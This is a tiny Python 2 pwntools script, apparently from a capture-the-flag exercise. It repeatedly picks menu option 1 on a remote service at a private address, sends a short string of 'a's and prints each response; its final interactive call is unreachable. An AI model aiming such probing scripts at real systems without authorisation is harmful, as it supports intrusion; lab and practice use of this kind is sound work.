#!/usr/bin/python
# -*- coding: utf-8 -*-
__Author__ = "LB@10.0.0.55"
from pwn import *
io = remote('10.4.21.55',9002)
payload = 'a'*6
while(1):
	io.recvuntil('choice: ')
	io.sendline('1')
	io.recvuntil("chars: ")
	io.sendline(payload)
	str = io.recvline()
	print str
io.interactive()
